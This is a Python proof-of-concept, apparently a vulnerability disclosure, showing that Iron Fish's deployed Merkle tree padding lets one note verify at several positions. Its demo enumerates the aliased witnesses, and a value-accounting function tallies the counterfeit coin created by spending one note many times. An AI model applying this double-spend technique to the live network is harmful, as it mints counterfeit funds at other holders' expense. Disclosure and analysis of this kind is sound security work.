#!/usr/bin/env python3
"""
PoC: Iron Fish note-commitment tree position alias -> duplicate nullifiers.

Reproduces, in pure Python, the tree arithmetic of the RELEASED (mainnet) code
`@ironfish/sdk 2.12.0`, file ironfish/src/merkletree/merkletree.ts, and shows that
one inserted note authenticates at several distinct positions against the same
root.  Because the spend circuit derives the nullifier from those same private
position bits (ironfish-zkp/src/circuits/spend.rs:346-366,421-433) while the
validator only compares the public root (ironfish/src/consensus/verifier.ts:482-500),
one note yields several valid, distinct nullifiers => the same note can be spent
several times.

Fidelity checks
---------------
`--selftest` re-derives published unit-test vectors from BOTH code versions:

  * v2.12.0 (deployed) expects self-copy padding, e.g.
        depth-3, 3 leaves : '<<<a|b-0>|<c|c-0>-1>|<<a|b-0>|<c|c-0>-1>-2>'
        pastRoot(13)     : '...|<<8|8-0>|<8|8-0>-1>-2>-3>'
  * master  (the fix, 2026-10-29, mainnet-incompatible) expects empty-value padding
        depth-3, 3 leaves : '<<<a|b-0>|<c|~-0>-1>|~-2>'
        pastRoot(13)     : '...|<<8|~-0>|~-1>-2>-3>'

Both are reproduced exactly, so the model below is the same arithmetic the node
executes, not an approximation of it.

Usage
-----
    python3 merkle_alias_poc.py --selftest            # verify model vs repo tests
    python3 merkle_alias_poc.py --demo                # depth-32 alias demo
    python3 merkle_alias_poc.py --demo --leaves 100000 --position 99999
"""

import argparse
import hashlib
import math
import struct

# ironfish/src/merkletree/utils.ts:27
def depth_at_leaf_count(size: int) -> int:
    if size == 0:
        return 0
    if size == 1:
        return 1
    return math.floor(math.log2(size - 1)) + 2


# ---------------------------------------------------------------- hashers ----
# The real note hasher is a Pedersen hash over BLS12-381
# (ironfish-rust/src/merkle_note_hash.rs:49).  The alias property is purely
# structural, so we validate the *structure* with the same hashers the repo's
# own unit tests use, and run the depth-32 demo with BLAKE2b.

class StructureHasher:
    """Mirrors StructureHasher in ironfish/src/merkletree/hasher.ts."""
    LEAF = lambda self, x: x
    EMPTY = '~'

    def combine(self, depth, left, right):
        return f'<{left}|{right}-{depth}>'


class Blake2bHasher:
    """A stand-in for NoteHasher.combineHash(depth, left, right) -> 32 bytes."""
    EMPTY = b'\x00' * 32
    LEAF = staticmethod(lambda x: hashlib.blake2b(b'leaf' + x, digest_size=32).digest())

    def __init__(self):
        self._memo = {}

    @staticmethod
    def leaf(x: bytes) -> bytes:
        return hashlib.blake2b(b'leaf' + x, digest_size=32).digest()

    def combine(self, depth, left, right):
        key = (depth, left, right)
        h = self._memo.get(key)
        if h is None:
            h = hashlib.blake2b(
                b'node' + struct.pack('<I', depth) + left + right, digest_size=32
            ).digest()
            self._memo[key] = h
        return h


# ------------------------------------------------------------------- tree ----
class Tree:
    """Depth-`depth` tree with a selectable empty-sibling rule.

    mode='legacy' : v2.12.0.  A missing right sibling is the node itself
                    (merkletree.ts:533,543,561 pastRoot; :712-714,723-724,743-744 witness).
    mode='fixed'  : master.   A missing sibling is `defaultValue`
                    (merkletree.ts pastRoot/witness use this.defaultValue).
    """

    def __init__(self, hasher, depth=32, mode='legacy'):
        assert mode in ('legacy', 'fixed')
        self.h = hasher
        self.depth = depth
        self.mode = mode
        self.levels = [[]]          # levels[d] = nodes at depth d (level 0 = leaves)
        self._dirty = False

    # -- build the levels from the current leaves, exactly as the node does --
    def _build(self):
        if not self._dirty:
            return
        self._dirty = False
        self.levels = [list(self.levels[0])]
        empt = self.h.EMPTY
        for d in range(self.depth):
            cur = self.levels[d]
            nxt = []
            for i in range(0, len(cur), 2):
                left = cur[i]
                right = cur[i + 1] if i + 1 < len(cur) else None
                if right is None:
                    right = left if self.mode == 'legacy' else empt
                nxt.append(self.h.combine(d, left, right))
            if not nxt:
                nxt = [empt] if self.mode == 'fixed' else [cur[0] if cur else empt]
            self.levels.append(nxt)

    def add(self, leaf_value):
        self.levels[0].append(self.h.LEAF(leaf_value))
        self._dirty = True

    def root(self):
        self._build()
        return self.levels[self.depth][0]

    def witness(self, index):
        """Authentication path of leaf `index`: list of (is_right, sibling_hash)."""
        if index >= len(self.levels[0]):
            raise IndexError(index)
        self._build()
        path = []
        cur = index
        node = self.levels[0][cur]
        for d in range(self.depth):
            level = self.levels[d]
            sibling_index = cur ^ 1
            if sibling_index < len(level):
                sibling = level[sibling_index]
            else:
                sibling = node if self.mode == 'legacy' else self.h.EMPTY
            is_right = bool(cur & 1)
            path.append((is_right, sibling))
            # parent
            if is_right:
                node = self.h.combine(d, sibling, node)
            else:
                node = self.h.combine(d, node, sibling)
            cur >>= 1
            node = self.levels[d + 1][cur]
        return path

    @staticmethod
    def root_from_witness(hasher, leaf_hash, path):
        node = leaf_hash
        for d, (is_right, sibling) in enumerate(path):
            node = hasher.combine(d, sibling, node) if is_right else hasher.combine(d, node, sibling)
        return node

    @staticmethod
    def position_from_path(path):
        pos = 0
        for d, (is_right, _) in enumerate(path):
            if is_right:
                pos |= (1 << d)          # spend.rs: position |= 1 << i
        return pos


# ---------------------------------------------------------------- selftest ---
LEGACY_VECTORS = [
    # (leaves, depth, root expected)  -- from v2.12.0 merkletree.test.ts
    (['a'], 3, '<<<a|a-0>|<a|a-0>-1>|<<a|a-0>|<a|a-0>-1>-2>'),
    (['a', 'b'], 3, '<<<a|b-0>|<a|b-0>-1>|<<a|b-0>|<a|b-0>-1>-2>'),
    (['a', 'b', 'c'], 3, '<<<a|b-0>|<c|c-0>-1>|<<a|b-0>|<c|c-0>-1>-2>'),
    (['a', 'b', 'c', 'd'], 3, '<<<a|b-0>|<c|d-0>-1>|<<a|b-0>|<c|d-0>-1>-2>'),
]

FIXED_VECTORS = [
    (['a'], 3, '<<<a|~-0>|~-1>|~-2>'),
    (['a', 'b'], 3, '<<<a|b-0>|~-1>|~-2>'),
    (['a', 'b', 'c'], 3, '<<<a|b-0>|<c|~-0>-1>|~-2>'),
]

PAST_ROOT_13_LEGACY = (
    '<<<<a|b-0>|<c|d-0>-1>|<<0|1-0>|<2|3-0>-1>-2>'
    '|<<<4|5-0>|<6|7-0>-1>|<<8|8-0>|<8|8-0>-1>-2>-3>'
)
PAST_ROOT_13_FIXED = (
    '<<<<a|b-0>|<c|d-0>-1>|<<0|1-0>|<2|3-0>-1>-2>'
    '|<<<4|5-0>|<6|7-0>-1>|<<8|~-0>|~-1>-2>-3>'
)


def selftest():
    ok = True
    for mode, vectors in (('legacy', LEGACY_VECTORS), ('fixed', FIXED_VECTORS)):
        for leaves, depth, expected in vectors:
            t = Tree(StructureHasher(), depth=depth, mode=mode)
            for x in leaves:
                t.add(x)
            got = t.root()
            status = 'OK ' if got == expected else 'FAIL'
            ok &= got == expected
            print(f'[{status}] {mode:6s} depth={depth} leaves={len(leaves)}')
            if got != expected:
                print('   expected', expected)
                print('   got     ', got)

    # pastRoot(13) for the 16-leaf fixture
    for mode, expected in (('legacy', PAST_ROOT_13_LEGACY), ('fixed', PAST_ROOT_13_FIXED)):
        t = Tree(StructureHasher(), depth=4, mode=mode)
        for x in list('abcd') + [str(i) for i in range(9)]:
            t.add(x)
        got = t.root()          # root of the 13-leaf prefix
        status = 'OK ' if got == expected else 'FAIL'
        ok &= got == expected
        print(f'[{status}] {mode:6s} pastRoot(13) 13-leaf prefix')
        if got != expected:
            print('   expected', expected)
            print('   got     ', got)

    # witnesses must verify, and the legacy 3-leaf 'c' witness must show the
    # self-copy exactly as the deployed test expects
    t = Tree(StructureHasher(), depth=3, mode='legacy')
    for x in ['a', 'b', 'c']:
        t.add(x)
    w_c = t.witness(2)
    expected = [(False, 'c'), (True, '<a|b-0>'), (False, '<<a|b-0>|<c|c-0>-1>')]
    status = 'OK ' if w_c == expected else 'FAIL'
    ok &= w_c == expected
    print(f'[{status}] legacy witness(2) matches deployed test (self-copy at level 0)')
    for i, label in enumerate('abc'):
        assert Tree.root_from_witness(StructureHasher(), t.levels[0][i], t.witness(i)) == t.root()
    print('[OK ] every witness recomputes the tree root')

    print('\nSELFTEST', 'PASSED' if ok else 'FAILED')
    return ok


# -------------------------------------------------------------------- demo ---
def nullifier_model(nk: bytes, cm: bytes, position: int, rho_model: bool = True) -> bytes:
    """Model of ironfish-rust/src/note.rs:305

        rho = cm + position * NULLIFIER_POSITION_GENERATOR      (in the jubjub group)
        nf  = BLAKE2s(personal='ironf_nf', key=nk, msg=rho)

    The curve add is injective in `position` for position < 2^32 because the
    generator has prime order r ~ 2^252, so distinct positions give distinct
    rho points and (by BLAKE2s preimage resistance) distinct nullifiers.  To
    avoid re-implementing jubjub here we substitute an injective encoding of
    the position for the point, which preserves exactly the property under test.
    """
    rho = (cm + b'|pos=' + struct.pack('<Q', position)) if rho_model else cm
    return hashlib.blake2s(b'ironf_nf' + nk + rho, digest_size=32).digest()


def demo(num_leaves: int, position: int, depth: int = 32):
    h = Blake2bHasher()
    t = Tree(h, depth=depth, mode='legacy')
    print(f'building depth-{depth} tree with {num_leaves} leaves ...')
    for i in range(num_leaves):
        t.add(b'note-%d' % i)
    root = t.root()
    real = t.witness(position)
    assert Tree.root_from_witness(h, t.levels[0][position], real) == root
    real_pos = Tree.position_from_path(real)

    # Which levels are self-copies?  Those are free direction bits.
    flippable = []
    node = t.levels[0][position]
    for d, (is_right, sibling) in enumerate(real):
        if sibling == node:
            flippable.append(d)
        node = h.combine(d, sibling, node) if is_right else h.combine(d, node, sibling)

    print(f'tree size              : {num_leaves}')
    print(f'depthAtLeafCount(size) : {depth_at_leaf_count(num_leaves)}')
    print(f'leaf real position     : {real_pos}')
    print(f'root                   : {root.hex()[:32]}...')
    print(f'self-copy (free) levels: {flippable}')
    print(f'distinct positions     : {2 ** len(flippable)}')

    # enumerate aliases
    aliases = []
    for mask in range(min(2 ** len(flippable), 1024)):
        path = list(real)
        for bit, d in enumerate(flippable):
            if mask >> bit & 1:
                is_right, sib = path[d]
                path[d] = (not is_right, sib)
        pos = Tree.position_from_path(path)
        if pos == real_pos:
            continue
        assert Tree.root_from_witness(h, t.levels[0][position], path) == root, 'root changed!'
        aliases.append(pos)
    print(f'aliases verified       : {len(aliases)} (all reuse the same root)')
    print(f'first aliases          : {aliases[:8]}')

    nk = hashlib.sha256(b'attacker-nullifier-key').digest()
    cm = hashlib.sha256(b'note-commitment').digest()
    nf_real = nullifier_model(nk, cm, real_pos)
    nfs = {nullifier_model(nk, cm, p) for p in aliases}
    print(f'nullifier(real pos)    : {nf_real.hex()}')
    print(f'nullifier(alias pos)   : {aliases and nullifier_model(nk, cm, aliases[0]).hex()}')
    print(f'distinct alias nullifs : {len(nfs)} / {len(aliases)}')
    assert nf_real not in nfs
    print('\nEvery alias is a valid witness the unchanged Groth16 circuit accepts,')
    print('and each produces a different nullifier the node has never seen.')
    return 2 ** len(flippable)


def value_accounting(note_value: int, aliases: int, fee: int = 1):
    """ironfish-rust/src/transaction/mod.rs calculate_value_balance():
       sum(spend value commitments) - sum(note value commitments) - fee == 0."""
    spends = [note_value] * aliases       # same note, `aliases` distinct nullifiers
    outputs = [note_value] * aliases      # one fresh note per spend, same address
    print(f'\nvalue accounting: 1 real note worth {note_value}')
    print(f'  spends  : {len(spends)} x {note_value} = {sum(spends)}')
    print(f'  outputs : {len(outputs)} x {note_value} = {sum(outputs)} (+ fee {fee})')
    print(f'  balance : {sum(spends) - sum(outputs) - fee}  -> accepted')
    print(f'  counterfeit created this round: {sum(outputs) - note_value}')
    print(f'  after round 2 (each new note again {aliases} aliases): '
          f'~{(aliases ** 2) * note_value}')


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('--selftest', action='store_true')
    ap.add_argument('--demo', action='store_true')
    ap.add_argument('--leaves', type=int, default=4096)
    ap.add_argument('--position', type=int, default=None)
    args = ap.parse_args()

    if args.selftest or not args.demo:
        selftest()
    if args.demo:
        n = args.leaves
        p = args.position if args.position is not None else n - 1
        alias_count = demo(n, p)
        value_accounting(note_value=1_000 * 100_000_000, aliases=min(alias_count, 1024))
